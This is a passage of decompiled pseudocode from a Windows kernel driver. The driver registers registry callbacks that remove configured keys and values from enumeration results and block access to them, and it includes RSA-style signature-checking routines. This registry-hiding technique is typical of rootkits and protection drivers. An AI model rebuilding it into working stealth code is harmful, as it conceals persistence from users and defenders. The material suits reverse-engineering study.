  EX_CALLBACK_FUNCTION *v2; // rbx
  __int64 i; // rax
  __int64 v6; // r8
  int result; // eax
  int v8; // edi
  int v9; // ebx
  struct _UNICODE_STRING DestinationString; // [rsp+30h] [rbp-28h] BYREF
  __int128 v11; // [rsp+40h] [rbp-18h]

  v2 = Function;
  v11 = 0LL;
  for ( i = Driver[1]; i; i = *(_QWORD *)(i + 16) )
  {
    v6 = *(_QWORD *)(i + 64);
    if ( v6 )
    {
      if ( !*(_DWORD *)v6 )
      {
        **(_QWORD **)(v6 + 8) = Function;
        v2 = *(EX_CALLBACK_FUNCTION **)(v6 + 16);
      }
      break;
    }
  }
  result = sub_140002D44(&qword_14000A2E0, 2u);
  if ( result >= 0 )
  {
    v8 = sub_140002D44(&qword_14000A2E8, 3u);
    if ( v8 >= 0 )
    {
      sub_14000643C(a2);
      RtlInitUnicodeString(&DestinationString, L"320001");
      result = CmRegisterCallbackEx(v2, &DestinationString, Driver, 0LL, &Cookie, 0LL);
      v9 = result;
      if ( result >= 0 )
      {
        byte_14000A2D8 = 1;
      }
      else
      {
        sub_140002C7C((void *)qword_14000A2E0);
        sub_140002C7C((void *)qword_14000A2E8);
        return v9;
      }
    }
    else
    {
      sub_140002C7C((void *)qword_14000A2E0);
      return v8;
    }
  }
  return result;
}


// Function: sub_14000643C at 0x14000643C
__int64 __fastcall sub_14000643C(__int64 a1)
{
  USHORT *v2; // rcx
  unsigned int v3; // edx
  unsigned __int16 v4; // r14
  USHORT v5; // di
  USHORT *v6; // rbx
  __int64 v7; // r8
  USHORT *v8; // rcx
  unsigned int v9; // edx
  unsigned __int16 v10; // si
  USHORT v11; // di
  USHORT *v12; // rbx
  __int64 v13; // r8
  UNICODE_STRING v15; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v16; // [rsp+68h] [rbp+38h] BYREF
  unsigned int v17; // [rsp+70h] [rbp+40h] BYREF
  USHORT *v18; // [rsp+78h] [rbp+48h] BYREF

  v18 = 0LL;
  v16 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters2", &v18, &v16) < 0 )
    goto LABEL_10;
  if ( v16 > 4 )
  {
    v2 = v18;
    v3 = v16 - 2;
    v16 -= 2;
    v4 = 0;
    v5 = *v18;
    v6 = v18 + 1;
    if ( !*v18 )
      goto LABEL_8;
    while ( 1 )
    {
      v7 = *v6;
      if ( v3 < (unsigned __int64)(v7 + 2) )
        break;
      *(_QWORD *)&v15.Length = 0LL;
      v15.Buffer = v6 + 1;
      v16 = -2 - v7 + v3;
      v15.MaximumLength = *v6;
      v15.Length = v15.MaximumLength;
      sub_1400060B4(&v15, &v17);
      ++v4;
      v6 = (USHORT *)((char *)v6 + *v6 + 2);
      if ( v4 >= v5 )
        break;
      v3 = v16;
    }
  }
  v2 = v18;
LABEL_8:
  if ( v2 )
    sub_140001DD4(v2);
LABEL_10:
  v18 = 0LL;
  v16 = 0;
  if ( (int)sub_140001AE8(a1, L"Parameters3", &v18, &v16) < 0 )
    return 0LL;
  if ( v16 > 4 )
  {
    v8 = v18;
    v9 = v16 - 2;
    v16 -= 2;
    v10 = 0;
    v11 = *v18;
    v12 = v18 + 1;
    if ( !*v18 )
      goto LABEL_17;
    while ( 1 )
    {
      v13 = *v12;
      if ( v9 < (unsigned __int64)(v13 + 2) )
        break;
      *(_QWORD *)&v15.Length = 0LL;
      v15.Buffer = v12 + 1;
      v16 = -2 - v13 + v9;
      v15.MaximumLength = *v12;
      v15.Length = v15.MaximumLength;
      sub_140006124(&v15, &v17);
      ++v10;
      v12 = (USHORT *)((char *)v12 + *v12 + 2);
      if ( v10 >= v11 )
        break;
      v9 = v16;
    }
  }
  v8 = v18;
LABEL_17:
  if ( v8 )
    sub_140001DD4(v8);
  return 0LL;
}


// Function: sub_1400065CC at 0x1400065CC
__int64 __fastcall sub_1400065CC(__int64 a1, __int64 a2)
{
  bool v2; // sf
  __int64 v4; // rbx
  PVOID PoolWithTag; // rsi
  NTSTATUS v6; // eax
  HANDLE KeyHandle; // [rsp+40h] [rbp-20h] BYREF
  UNICODE_STRING v9; // [rsp+48h] [rbp-18h] BYREF
  int v10; // [rsp+88h] [rbp+28h] BYREF
  ULONG ResultLength; // [rsp+90h] [rbp+30h] BYREF
  PCUNICODE_STRING ObjectName; // [rsp+98h] [rbp+38h] BYREF

  ObjectName = 0LL;
  v2 = *(int *)(a2 + 8) < 0;
  v9 = 0LL;
  if ( !v2 && CmCallbackGetKeyObjectID(&Cookie, *(PVOID *)a2, 0LL, &ObjectName) >= 0 )
  {
    v4 = *(_QWORD *)(a2 + 16);
    if ( sub_1400062BC(*(_DWORD *)(v4 + 12), *(__int16 **)(v4 + 16), (__int64)&v9) )
    {
      v10 = 0;
      sub_140002BAC((__int64 **)qword_14000A2E0, (UNICODE_STRING *)ObjectName, &v9, &v10);
      if ( v10 )
      {
        if ( ObOpenObjectByPointer(*(PVOID *)a2, 0x200u, 0LL, 0xF003Fu, (POBJECT_TYPE)CmKeyObjectType, 0, &KeyHandle) >= 0 )
        {
          PoolWithTag = ExAllocatePoolWithTag(PagedPool, *(unsigned int *)(v4 + 24), 0x46526C46u);
          if ( PoolWithTag )
          {
            while ( 1 )
            {
              v6 = ZwEnumerateKey(
                     KeyHandle,
                     v10 + *(_DWORD *)(v4 + 8),
                     *(KEY_INFORMATION_CLASS *)(v4 + 12),
                     PoolWithTag,
                     *(_DWORD *)(v4 + 24),
                     &ResultLength);
              if ( v6 == -2147483622 )
                break;
              if ( v6 < 0 || !sub_1400062BC(*(_DWORD *)(v4 + 12), (__int16 *)PoolWithTag, (__int64)&v9) )
                goto LABEL_13;
              if ( !sub_140002BAC((__int64 **)qword_14000A2E0, (UNICODE_STRING *)ObjectName, &v9, &v10) )
              {
                **(_DWORD **)(v4 + 32) = ResultLength;
                sub_140007A80(*(_QWORD *)(v4 + 16), PoolWithTag, ResultLength);
                goto LABEL_13;
              }
            }
            **(_DWORD **)(v4 + 32) = 0;
            *(_DWORD *)(v4 + 24) = 0;
            *(_DWORD *)(a2 + 24) = -1073741275;
LABEL_13:
            ExFreePoolWithTag(PoolWithTag, 0x46526C46u);
          }
          ZwClose(KeyHandle);
        }
      }
    }
  }
  return 0LL;
}


// Function: sub_14000676C at 0x14000676C
__int64 __fastcall sub_14000676C(__int64 a1, __int64 a2)
{
  bool v2; // sf
  __int64 v4; // rbx
  PVOID PoolWithTag; // rsi
  NTSTATUS v6; // eax
  HANDLE KeyHandle; // [rsp+40h] [rbp-20h] BYREF
  UNICODE_STRING v9; // [rsp+48h] [rbp-18h] BYREF
  int v10; // [rsp+88h] [rbp+28h] BYREF
  ULONG ResultLength; // [rsp+90h] [rbp+30h] BYREF
  PCUNICODE_STRING ObjectName; // [rsp+98h] [rbp+38h] BYREF

  ObjectName = 0LL;
  v2 = *(int *)(a2 + 8) < 0;
  v9 = 0LL;
  if ( !v2 && CmCallbackGetKeyObjectID(&Cookie, *(PVOID *)a2, 0LL, &ObjectName) >= 0 )
  {
    v4 = *(_QWORD *)(a2 + 16);
    if ( sub_1400062F0(*(_DWORD *)(v4 + 12), *(_QWORD *)(v4 + 16), (__int64)&v9) )
    {
      v10 = 0;
      sub_140002BAC((__int64 **)qword_14000A2E8, (UNICODE_STRING *)ObjectName, &v9, &v10);
      if ( v10 )
      {
        if ( ObOpenObjectByPointer(*(PVOID *)a2, 0x200u, 0LL, 0xF003Fu, (POBJECT_TYPE)CmKeyObjectType, 0, &KeyHandle) >= 0 )
        {
          PoolWithTag = ExAllocatePoolWithTag(PagedPool, *(unsigned int *)(v4 + 24), 0x46526C46u);
          if ( PoolWithTag )
          {
            while ( 1 )
            {
              v6 = ZwEnumerateValueKey(
                     KeyHandle,
                     v10 + *(_DWORD *)(v4 + 8),
                     *(KEY_VALUE_INFORMATION_CLASS *)(v4 + 12),
                     PoolWithTag,
                     *(_DWORD *)(v4 + 24),
                     &ResultLength);
              if ( v6 == -2147483622 )
                break;
              if ( v6 < 0 || !sub_1400062F0(*(_DWORD *)(v4 + 12), (__int64)PoolWithTag, (__int64)&v9) )
                goto LABEL_13;
              if ( !sub_140002BAC((__int64 **)qword_14000A2E8, (UNICODE_STRING *)ObjectName, &v9, &v10) )
              {
                **(_DWORD **)(v4 + 32) = ResultLength;
                sub_140007A80(*(_QWORD *)(v4 + 16), PoolWithTag, ResultLength);
                goto LABEL_13;
              }
            }
            **(_DWORD **)(v4 + 32) = 0;
            *(_DWORD *)(v4 + 24) = 0;
            *(_DWORD *)(a2 + 24) = -1073741275;
LABEL_13:
            ExFreePoolWithTag(PoolWithTag, 0x46526C46u);
          }
          ZwClose(KeyHandle);
        }
      }
    }
  }
  return 0LL;
}


// Function: sub_14000690C at 0x14000690C
__int64 __fastcall sub_14000690C(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = 0LL;
  if ( !*(_DWORD *)(a2 + 16) )
    return 0LL;
  while ( !sub_140006220(*(PVOID *)a2, *(const UNICODE_STRING **)(*(_QWORD *)(a2 + 8) + 24 * v2)) )
  {
    v2 = (unsigned int)(v2 + 1);
    if ( (unsigned int)v2 >= *(_DWORD *)(a2 + 16) )
      return 0LL;
  }
  return 3221226021LL;
}


// Function: Function at 0x140006954
__int64 __fastcall Function(__int64 CallbackContext, PVOID Argument1, __int64 Argument2)
{
  int v3; // edx
  int v4; // edx
  int v5; // edx
  int v6; // edx
  char v7; // al
  char v9; // al
  int v10; // edx
  int v11; // edx
  int v12; // edx

  if ( (int)Argument1 <= 12 )
  {
    if ( (_DWORD)Argument1 == 12 )
    {
LABEL_8:
      v7 = sub_140002BA4((__int64 **)qword_14000A2E0, *(__m128i **)Argument2);
      return v7 != 0 ? 0xC0000022 : 0;
    }
    v3 = (_DWORD)Argument1 - 1;
    if ( v3 )
    {
      v4 = v3 - 1;
      if ( v4 )
      {
        v5 = v4 - 6;
        if ( v5 )
        {
          v6 = v5 - 1;
          if ( !v6 )
            return sub_14000690C(CallbackContext, Argument2);
          if ( v6 == 1 )
            goto LABEL_8;
          return 0LL;
        }
      }
    }
    v9 = sub_140006220(*(PVOID *)Argument2, *(const UNICODE_STRING **)(Argument2 + 8));
    return v9 != 0 ? 0xC0000225 : 0;
  }
  v10 = (_DWORD)Argument1 - 20;
  if ( !v10 )
    return sub_1400065CC(CallbackContext, Argument2);
  v11 = v10 - 1;
  if ( v11 )
  {
    v12 = v11 - 5;
    if ( !v12 )
    {
      v7 = sub_1400061A4(*(PVOID *)(Argument2 + 8), *(_QWORD *)Argument2);
      return v7 != 0 ? 0xC0000022 : 0;
    }
    if ( v12 != 2 )
      return 0LL;
    v9 = sub_1400061A4(*(PVOID *)(Argument2 + 8), *(_QWORD *)Argument2);
    return v9 != 0 ? 0xC0000225 : 0;
  }
  return sub_14000676C(CallbackContext, Argument2);
}


// Function: sub_140006A44 at 0x140006A44
__int64 sub_140006A44(__int16 *a1, const wchar_t *a2, ...)
{
  unsigned __int16 v3; // cx
  unsigned __int16 v4; // ax
  unsigned int v5; // ebx
  size_t v6; // rsi
  int v7; // eax
  va_list Args; // [rsp+50h] [rbp+18h] BYREF

  va_start(Args, a2);
  v3 = *a1;
  if ( (v3 & 1) != 0 )
    return (unsigned int)-1073741811;
  v4 = a1[1];
  if ( (v4 & 1) != 0 )
    return (unsigned int)-1073741811;
  if ( v3 > v4 )
    return (unsigned int)-1073741811;
  if ( v4 == 0xFFFF )
    return (unsigned int)-1073741811;
  v5 = 0;
  if ( !*((_QWORD *)a1 + 1) && (v3 || v4) )
  {
    return (unsigned int)-1073741811;
  }
  else
  {
    v6 = (unsigned __int64)(unsigned __int16)a1[1] >> 1;
    v7 = vsnwprintf(*((wchar_t **)a1 + 1), v6, a2, Args);
    if ( v7 < 0 || v7 > v6 )
    {
      LOWORD(v7) = v6;
      v5 = -2147483643;
    }
    *a1 = 2 * v7;
  }
  return v5;
}


// Function: sub_140006AD8 at 0x140006AD8
__int64 __fastcall sub_140006AD8(__int64 a1, __int64 a2, int a3)
{
  int v3; // r8d
  unsigned int *i; // r9
  unsigned int v5; // eax

  v3 = a3 - 1;
  if ( v3 < 0 )
    return 0LL;
  for ( i = (unsigned int *)(a2 + 4LL * v3); ; --i )
  {
    v5 = *(unsigned int *)((char *)i + a1 - a2);
    if ( v5 > *i )
      break;
    if ( v5 < *i )
      return 0xFFFFFFFFLL;
    if ( --v3 < 0 )
      return 0LL;
  }
  return 1LL;
}


// Function: sub_140006B10 at 0x140006B10
__int64 __fastcall sub_140006B10(_DWORD *a1, unsigned int a2, __int64 a3, int a4)
{
  __int64 result; // rax
  __int64 v6; // r9
  __int64 v8; // r10
  _DWORD *v9; // r11
  int v10; // r8d
  unsigned int v11; // ecx

  if ( a2 )
  {
    result = (unsigned int)(a4 - 1);
    v6 = (int)result;
    v8 = 0LL;
    v9 = a1;
    do
    {
      if ( v6 < 0 )
        break;
      v10 = 0;
      v11 = 0;
      do
      {
        if ( v11 >= 0x20 )
          break;
        result = *(unsigned __int8 *)(v6 + a3) << v11;
        v11 += 8;
        v10 |= result;
        --v6;
      }
      while ( v6 >= 0 );
      *v9 = v10;
      v8 = (unsigned int)(v8 + 1);
      ++v9;
    }
    while ( (unsigned int)v8 < a2 );
    if ( (unsigned int)v8 < a2 )
      return sub_140007D40(&a1[v8], 0LL, 4LL * (a2 - (unsigned int)v8));
  }
  return result;
}


// Function: sub_140006B88 at 0x140006B88
__int64 __fastcall sub_140006B88(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, unsigned int a6)
{
  __int64 result; // rax
  __int64 v8; // rcx
  __int64 v9; // rsi
  unsigned int v10; // ebx
  unsigned int v11; // ecx
  __int64 v12; // r13
  unsigned int i; // eax
  unsigned int v14; // r12d
  int v15; // edx
  __int64 v16; // rdi
  char *v17; // r13
  __int64 v18; // r9
  unsigned __int64 v19; // r14
  int v20; // r10d
  _DWORD *v21; // r9
  __int64 v22; // r11
  unsigned int v23; // edx
  unsigned __int64 v24; // r8
  unsigned int v25; // eax
  BOOL v26; // ecx
  unsigned int v27; // edx
  int v28; // r10d
  int v29; // r9d
  int v31; // [rsp+20h] [rbp-E0h]
  unsigned int v32; // [rsp+28h] [rbp-D8h]
  char *v34; // [rsp+38h] [rbp-C8h]
  _DWORD v35[132]; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v36[260]; // [rsp+250h] [rbp+150h] BYREF

  result = a6 - 1;
  v8 = (int)result;
  v9 = a4;
  if ( (int)(a6 - 1) >= 0 )
  {
    do
    {
      if ( *(_DWORD *)(a5 + 4 * v8) )
        break;
      result = (unsigned int)(result - 1);
      --v8;
    }
    while ( v8 >= 0 );
  }
  v10 = result + 1;
  if ( (_DWORD)result != -1 )
  {
    v11 = *(_DWORD *)(a5 + 4 * result);
    v12 = (unsigned int)result;
    for ( i = 0; i < 0x20; ++i )
    {
      if ( !v11 )
        break;
      v11 >>= 1;
    }
    v14 = 32 - i;
    v32 = 32 - i;
    if ( v10 )
      sub_140007D40(v36, 0LL, 4LL * v10);
    v36[v9] = sub_1400072DC(v36, a3, v14, (unsigned int)v9);
    sub_1400072DC(v35, a5, v14, v10);
    v15 = v35[v12];
    v31 = v15;
    if ( (_DWORD)v9 )
    {
      sub_140007D40(a1, 0LL, 4 * v9);
      v15 = v31;
    }
    v16 = (unsigned int)v9 - v10;
    if ( (int)(v9 - v10) >= 0 )
    {
      v17 = (char *)v36 + 4LL * (int)v16 - (_QWORD)v35;
      v34 = (char *)v35 + a1 - (_QWORD)v36;
      do
      {
        v18 = (unsigned int)v36[v9];
        if ( v15 == -1 )
          LODWORD(v19) = v36[v9];
        else
          v19 = ((v18 << 32) + (unsigned __int64)(unsigned int)v36[(unsigned int)(v9 - 1)]) / (unsigned int)(v15 + 1);
        v20 = 0;
        if ( (_DWORD)v19 && v10 )
        {
          v21 = v35;
          v22 = v10;
          do
          {
            v23 = *(_DWORD *)&v17[(_QWORD)v21] - v20;
            v24 = (unsigned int)v19 * (unsigned __int64)(unsigned int)*v21;
            v25 = ~(v19 * *v21);
            v26 = v23 > ~v20;
            v27 = v23 - v24;
            *(_DWORD *)&v17[(_QWORD)v21++] = v27;
            v28 = v26 + 1;
            if ( v27 <= v25 )
              v28 = v26;
            v20 = HIDWORD(v24) + v28;
            --v22;
          }
          while ( v22 );
          LODWORD(v18) = v36[v9];
        }
        v29 = v18 - v20;
        v36[v9] = v29;
        while ( v29 || (int)sub_140006AD8((__int64)&v36[v16], (__int64)v35, v10) >= 0 )
        {
          LODWORD(v19) = v19 + 1;
          v36[v9] -= sub_1400073B8(&v36[v16], &v36[v16], v35, v10);
          v29 = v36[v9];
        }
        v9 = (unsigned int)(v9 - 1);
        v15 = v31;
        *(_DWORD *)&v17[(_QWORD)v34] = v19;
        v17 -= 4;
        v16 = (unsigned int)(v16 - 1);
      }
      while ( (int)v16 >= 0 );
      v14 = v32;
    }
    if ( a6 )
      sub_140007D40(a2, 0LL, 4LL * a6);
    return sub_140007348(a2, v36, v14, v10);
  }
  return result;
}


// Function: sub_140006E30 at 0x140006E30
__int64 __fastcall sub_140006E30(__int64 a1, int a2, unsigned int *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  int v5; // r11d
  __int64 v7; // rdx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  __int64 result; // rax

  v4 = 0;
  v5 = a2 - 1;
  if ( a4 )
  {
    v7 = v5;
    do
    {
      if ( v7 < 0 )
        break;
      v8 = *a3;
      v9 = 0;
      do
      {
        if ( v9 >= 0x20 )
          break;
        --v5;
        result = v8 >> v9;
        v9 += 8;
        *(_BYTE *)(v7 + a1) = result;
        --v7;
      }
      while ( v7 >= 0 );
      ++v4;
      ++a3;
    }
    while ( v4 < a4 );
  }
  if ( v5 >= 0 )
    return sub_140007D40(a1, 0LL, v5 + 1LL);
  return result;
}


// Function: sub_140006EA4 at 0x140006EA4
__int64 __fastcall sub_140006EA4(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, unsigned int a5)
{
  _BYTE v10[1040]; // [rsp+30h] [rbp-438h] BYREF

  sub_140007D40(v10, 0LL, 1032LL);
  return sub_140006B88((__int64)v10, a1, a2, a3, a4, a5);
}


// Function: sub_140006F2C at 0x140006F2C
__int64 __fastcall sub_140006F2C(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 a5, unsigned int a6)
{
  __int64 v7; // r12
  int v8; // edi
  int v9; // edi
  __int64 result; // rax
  __int64 v11; // r14
  int i; // r15d
  unsigned int v13; // ebx
  __int64 v14; // r12
  _DWORD v17[132]; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v18[129]; // [rsp+250h] [rbp+150h] BYREF
  _BYTE v19[516]; // [rsp+454h] [rbp+354h] BYREF
  char v20; // [rsp+658h] [rbp+558h] BYREF

  v7 = a3;
  v8 = a2;
  if ( a6 )
    sub_140007A80(v18, a2, 4LL * a6);
  sub_140007114((unsigned int)v19, (unsigned int)v18, v8, a5, a6);
  sub_140007114((unsigned int)&v20, (unsigned int)v19, v8, a5, a6);
  if ( a6 )
    sub_140007D40(v17, 0LL, 4LL * a6);
  v9 = a4 - 1;
  v17[0] = 1;
  for ( result = a4 - 1; result >= 0; --result )
  {
    if ( *(_DWORD *)(v7 + 4 * result) )
      break;
    --v9;
  }
  v11 = v9;
  for ( i = v9; v11 >= 0; --v11 )
  {
    v13 = *(_DWORD *)(v7 + 4 * v11);
    LODWORD(result) = 32;
    if ( i != v9 || v13 >= 0x40000000 )
      goto LABEL_13;
    do
    {
      v13 *= 4;
      result = (unsigned int)(result - 2);
    }
    while ( v13 < 0x40000000 );
    if ( (_DWORD)result )
    {
LABEL_13:
      v14 = ((unsigned int)(result - 1) >> 1) + 1;
      do
      {
        sub_140007114((unsigned int)v17, (unsigned int)v17, (unsigned int)v17, a5, a6);
        sub_140007114((unsigned int)v17, (unsigned int)v17, (unsigned int)v17, a5, a6);
        result = v13 >> 30;
        if ( (_DWORD)result )
          result = sub_140007114((unsigned int)v17, (unsigned int)v17, (unsigned int)&v18[129 * result - 129], a5, a6);
        v13 *= 4;
        --v14;
      }
      while ( v14 );
      v7 = a3;
    }
    --i;
  }
  if ( a6 )
    return sub_140007A80(a1, v17, 4LL * a6);
  return result;
}


// Function: sub_140007114 at 0x140007114
__int64 __fastcall sub_140007114(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  _BYTE v8[1040]; // [rsp+30h] [rbp-438h] BYREF

  sub_140007180(v8, a2, a3, a5);
  return sub_140006EA4(a1, (__int64)v8, 2 * a5, a4, a5);
}


// Function: sub_140007180 at 0x140007180
__int64 __fastcall sub_140007180(__int64 a1, __int64 a2, char *a3, int a4)
{
  unsigned int v4; // edi
  __int64 v8; // r15
  int v9; // r8d
  int v10; // edx
  __int64 result; // rax
  __int64 i; // rcx
  unsigned int v13; // r14d
  unsigned int v14; // r10d
  unsigned int v15; // ebp
  char *v16; // r9
  char *v17; // rbx
  unsigned int v18; // eax
  unsigned int v19; // r11d
  __int64 v20; // r12
  char *v21; // r15
  unsigned int v22; // ecx
  unsigned __int64 v23; // r8
  BOOL v24; // edx
  int v25; // r11d
  _DWORD v27[260]; // [rsp+30h] [rbp-458h] BYREF

  v4 = 2 * a4;
  v8 = a1;
  if ( 2 * a4 )
    sub_140007D40(v27, 0LL, 4LL * v4);
  v9 = a4 - 1;
  v10 = a4 - 1;
  result = a4 - 1;
  for ( i = result; result >= 0; --result )
  {
    if ( *(_DWORD *)(a2 + 4 * result) )
      break;
    --v10;
  }
  v13 = v10 + 1;
  if ( v9 >= 0LL )
  {
    do
    {
      if ( *(_DWORD *)&a3[4 * i] )
        break;
      --v9;
      --i;
    }
    while ( i >= 0 );
  }
  v14 = 0;
  v15 = v9 + 1;
  if ( v10 != -1 )
  {
    v16 = (char *)((char *)v27 - a3);
    v17 = &a3[a2 - (_QWORD)v27];
    do
    {
      v18 = *(_DWORD *)&v16[(_QWORD)v17];
      v19 = 0;
      if ( v18 && v15 )
      {
        v20 = v15;
        v21 = a3;
        do
        {
          v22 = v19 + *(_DWORD *)&v16[(_QWORD)v21];
          v23 = v18 * (unsigned __int64)*(unsigned int *)v21;
          v24 = v22 < v19;
          *(_DWORD *)&v16[(_QWORD)v21] = v22 + v23;
          v25 = v24 + 1;
          if ( v22 + (unsigned int)v23 >= (unsigned int)v23 )
            v25 = v24;
          v21 += 4;
          v19 = HIDWORD(v23) + v25;
          --v20;
        }
        while ( v20 );
      }
      result = v14 + v15;
      v16 += 4;
      v27[result] += v19;
      ++v14;
    }
    while ( v14 < v13 );
    v8 = a1;
  }
  if ( v4 )
    return sub_140007A80(v8, v27, 4LL * v4);
  return result;
}


// Function: sub_1400072DC at 0x1400072DC
__int64 __fastcall sub_1400072DC(int *a1, __int64 a2, unsigned int a3, __int64 a4)
{
  int *v5; // rbx
  char v7; // r10
  unsigned int v8; // r8d
  __int64 v9; // rdi
  unsigned int v10; // edx

  v5 = a1;
  if ( a3 >= 0x20 )
    return 0LL;
  v7 = 32 - a3;
  v8 = 0;
  if ( (_DWORD)a4 )
  {
    v9 = a2 - (_QWORD)a1;
    a4 = (unsigned int)a4;
    do
    {
      v10 = *(unsigned int *)((char *)v5 + v9) >> v7;
      *v5 = v8 | (*(int *)((char *)v5 + v9) << a3);
      ++v5;
      v8 = a3 != 0 ? v10 : 0;
      --a4;
    }
    while ( a4 );
  }
  return v8;
}


// Function: sub_140007348 at 0x140007348
__int64 __fastcall sub_140007348(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  int v6; // eax
  char v7; // r10
  unsigned int v8; // r8d
  __int64 v9; // r9
  int *v10; // rdi
  __int64 v11; // rbx
  int v12; // edx

  if ( a3 >= 0x20 )
    return 0LL;
  v6 = a4 - 1;
  v7 = 32 - a3;
  v8 = 0;
  v9 = a4 - 1;
  if ( v6 >= 0 )
  {
    v10 = (int *)(a1 + 4LL * v6);
    v11 = a2 - a1;
    do
    {
      v12 = *(int *)((char *)v10 + v11) << v7;
      *v10 = v8 | (*(unsigned int *)((char *)v10 + v11) >> a3);
      --v10;
      v8 = a3 != 0 ? v12 : 0;
      --v9;
    }
    while ( v9 >= 0 );
  }
  return v8;
}


// Function: sub_1400073B8 at 0x1400073B8
__int64 __fastcall sub_1400073B8(__int64 a1, __int64 a2, _DWORD *a3, __int64 a4)
{
  unsigned int v4; // r10d
  __int64 v5; // rbx
  __int64 v6; // r11
  unsigned int v7; // ecx
  unsigned int v8; // ecx

  v4 = 0;
  if ( (_DWORD)a4 )
  {
    v5 = a2 - (_QWORD)a3;
    a4 = (unsigned int)a4;
    v6 = a1 - (_QWORD)a3;
    do
    {
      v7 = *(_DWORD *)((char *)a3 + v5) - v4;
      if ( v7 <= ~v4 )
      {
        v8 = v7 - *a3;
        v4 = v8 > ~*a3;
      }
      else
      {
        v8 = ~*a3;
      }
      *(_DWORD *)((char *)a3++ + v6) = v8;
      --a4;
    }
    while ( a4 );
  }
  return v4;
}


// Function: sub_14000741C at 0x14000741C
__int64 __fastcall sub_14000741C(__int64 a1, unsigned int *a2, __int64 a3, int a4, _DWORD *a5)
{
  int v7; // ebx
  int v8; // edi
  __int64 i; // rax
  unsigned int v10; // edi
  __int64 j; // rax
  unsigned int v13; // edx
  _DWORD v14[132]; // [rsp+30h] [rbp-D0h] BYREF
  _DWORD v15[132]; // [rsp+240h] [rbp+140h] BYREF
  _DWORD v16[132]; // [rsp+450h] [rbp+350h] BYREF
  unsigned int v17[132]; // [rsp+660h] [rbp+560h] BYREF

  sub_140006B10(v16, 0x81u, a3, a4);
  sub_140006B10(v14, 0x81u, (__int64)(a5 + 1), 512);
  sub_140006B10(v15, 0x81u, (__int64)(a5 + 129), 512);
  v7 = 128;
  v8 = 128;
  for ( i = 128LL; i >= 0; --i )
  {
    if ( v14[i] )
      break;
    --v8;
  }
  v10 = v8 + 1;
  for ( j = 128LL; j >= 0; --j )
  {
    if ( v15[j] )
      break;
    --v7;
  }
  if ( (int)sub_140006AD8((__int64)v16, (__int64)v14, v10) >= 0 )
    return 4097LL;
  sub_140006F2C((__int64)v17, (__int64)v16, (__int64)v15, v7 + 1, (__int64)v14, v10);
  v13 = (unsigned int)(*a5 + 7) >> 3;
  *a2 = v13;
  sub_140006E30(a1, v13, v17, v10);
  return 0LL;
}


// Function: sub_140007558 at 0x140007558
__int64 __fastcall sub_140007558(int a1, int a2, int a3, int a4)
{
  char *v8; // rax
  _OWORD *v9; // r10
  __int64 v10; // r11
  __int128 v11; // xmm1
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  int v19; // [rsp+30h] [rbp-418h] BYREF
  char v20; // [rsp+34h] [rbp-414h] BYREF
  _BYTE v21[524]; // [rsp+234h] [rbp-214h] BYREF

  sub_140007D40(v21, 0LL, 509LL);
  v19 = 4096;
  v8 = &v20;
  v9 = &unk_14000A000;
  v10 = 4LL;
  do
  {
    v11 = v9[1];
    *(_OWORD *)v8 = *v9;
    v12 = v9[2];
    *((_OWORD *)v8 + 1) = v11;
    v13 = v9[3];
    *((_OWORD *)v8 + 2) = v12;
    v14 = v9[4];
    *((_OWORD *)v8 + 3) = v13;
    v15 = v9[5];
    *((_OWORD *)v8 + 4) = v14;
    v16 = v9[6];
    *((_OWORD *)v8 + 5) = v15;
    v17 = v9[7];
    v9 += 8;
    *((_OWORD *)v8 + 6) = v16;
    v8 += 128;
    *((_OWORD *)v8 - 1) = v17;
    --v10;
  }
  while ( v10 );
  *(_WORD *)&v21[509] = word_14000A200;
  v21[511] = byte_14000A202;
  return sub_140007650(a1, a2, a3, a4, (__int64)&v19);
}


// Function: sub_140007650 at 0x140007650
__int64 __fastcall sub_140007650(__int64 a1, _DWORD *a2, __int64 a3, unsigned int a4, _DWORD *a5)
{
  unsigned int v7; // ebx
  __int64 result; // rax
  unsigned int v9; // r9d
  char *v10; // rax
  __int64 v11; // rax
  unsigned int v12; // r9d
  unsigned int v13[4]; // [rsp+30h] [rbp-238h] BYREF
  _BYTE v14[2]; // [rsp+40h] [rbp-228h] BYREF
  char v15; // [rsp+42h] [rbp-226h] BYREF

  v7 = (unsigned int)(*a5 + 7) >> 3;
  if ( a4 > v7 )
    return 4098LL;
  result = sub_14000741C((__int64)v14, v13, a3, a4, a5);
  if ( (_DWORD)result )
    return result;
  if ( v13[0] != v7 )
    return 4098LL;
  if ( v14[0] || v14[1] != 1 )
    return 4097LL;
  v9 = 2;
  if ( v7 - 1 > 2 )
  {
    v10 = &v15;
    do
    {
      if ( *v10 != -1 )
        break;
      ++v9;
      ++v10;
    }
    while ( v9 < v7 - 1 );
  }
  v11 = v9;
  v12 = v9 + 1;
  if ( v14[v11] )
    return 4097LL;
  *a2 = v7 - v12;
  if ( v7 - v12 + 11 > v7 )
    return 4097LL;
  sub_140007A80(a1, &v14[v12], v7 - v12);
  return 0LL;
}


// Function: FltRegisterFilter at 0x140007734
// attributes: thunk
NTSTATUS __stdcall FltRegisterFilter(
        PDRIVER_OBJECT Driver,
        const FLT_REGISTRATION *Registration,
        PFLT_FILTER *RetFilter)
{
  return __imp_FltRegisterFilter(Driver, Registration, RetFilter);
}


// Function: FltUnregisterFilter at 0x14000773A
// attributes: thunk
void __stdcall FltUnregisterFilter(PFLT_FILTER Filter)
{
  __imp_FltUnregisterFilter(Filter);
}


// Function: FltStartFiltering at 0x140007740
// attributes: thunk
NTSTATUS __stdcall FltStartFiltering(PFLT_FILTER Filter)
{
  return __imp_FltStartFiltering(Filter);
}


// Function: FltGetFileNameInformation at 0x140007746
// attributes: thunk
NTSTATUS __stdcall FltGetFileNameInformation(
        PFLT_CALLBACK_DATA CallbackData,
